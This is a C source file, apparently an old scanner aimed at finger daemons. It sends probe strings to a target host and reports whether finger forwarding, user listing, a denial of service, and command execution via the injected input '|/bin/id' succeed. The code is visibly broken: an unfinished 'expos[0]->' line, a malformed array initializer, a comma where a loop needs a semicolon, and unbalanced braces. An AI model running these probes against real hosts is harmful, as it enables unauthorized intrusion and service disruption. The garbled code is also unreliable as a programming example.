#include "net.h"


struct fin_expos {
	char *key;
	char **errmsg;
	char *needle;
};



char keys[FIN_KEYS][40] {
	"@",
	"|/bin/id",
	"search.*",
	"@@@@@@@@@@@@@@@@",
	NULL  
}



void f_exploit(int sockfd, char buf[20], char *sbuf) {

	char str[25];

	memset((char *)sbuf, 0, 5000);
	sprintf(str, "%s\n\r", buf);
	if (sock_write(sockfd, str, sizeof(str)) < 0) {
		perror("sock_write");
		exit(1);
	}
	if (sock_read(sockfd, sbuf, 5000) < 0) {
		perror("sock_read");
		exit(1);
	}
}


	

int finscan(char *host)
{

	int sockfd;
	char *sbuf;
	struct fin_expos *expos[FIN_KEYS+1];
	int index, index2;

	index=index2=0;

	
	if ((expos = malloc(FIN_KEYS*sizeof(struct fin_expos)))==NULL) {
		fprintf(stderr,"finscan out of mem.\n");
		exit(1);
	}
	expos[FIN_KEYS+1]==(struct fin_expos)NULL; 

	if ((sbuf = malloc(5000)) == NULL) {
		printf("memory allocation failure.\n");
		exit(1);
	}
	for (index=0; keys[index]!=(char *)NULL; index++) {
		expos[index]->key = keys[index];
	}
	expos[0]->

	if ((sockfd = f_connect(host)) == 1) {
		fprintf(stderr,"%s: Finger service not found.\n", host);
		return;
	}
	else { 
		fprintf(stderr, "%s: Finger service detected.\n\n", host);
	}



	for (index2=0; expos[index2]!=(struct fin_expos)NULL, index2++) {

		f_exploit(sockfd, expos[index2]->key, sbuf);
	/*	fprintf(stderr, "-%s-\n", sbuf); */
		if (strstr(sbuf, FIN_NEEDLE1) == NULL) {
		fprintf(stdout, "%s: Finger forwarding allowed.\n", host); 
	} else { 
		fprintf(stdout, "%s: Finger forwarding not allowed.\n", host); 
	}

	close(sockfd);
	if ((sockfd = f_connect(host)) == 1) {
		exit(1);
	}

	f_exploit(sockfd, "|/bin/id", sbuf);
	if (strstr(sbuf, FIN_NEEDLE2) != NULL) {
		fprintf(stdout, "%s: Command executed.\n", host);
	} else { 
		fprintf(stdout, "%s: Command NOT executed.\n", host); 
	}

	close(sockfd);
	if ((sockfd = f_connect(host)) == 1) {
		exit(1);
	}

	f_exploit(sockfd, "search.*", sbuf);
	if (strstr(sbuf, FIN_NEEDLE3) != NULL) {
		fprintf(stdout, "%s: User list displayed.\n", host);
	} else { 
		fprintf(stdout, "%s: Users hidden.\n", host); 
	}
	close(sockfd);
	if ((sockfd = f_connect(host)) == 1) {
		exit(1);
	}


	f_exploit(sockfd, "@@@@@@@@@", sbuf);
	if (strstr(sbuf, FIN_FAIL) == NULL) {
		if (strstr(sbuf, FIN_NEEDLE1) == NULL) {
			fprintf(stdout, "%s: Finger DoS exploited.\n", host);
		}
	} else {
		fprintf(stdout,"%s: Finger not DoS'able.\n", host); 
	}

}
	



main (int argc, char **argv) {


	printf("canning %s\n", argv[1]);
	finscan(argv[1]);
}
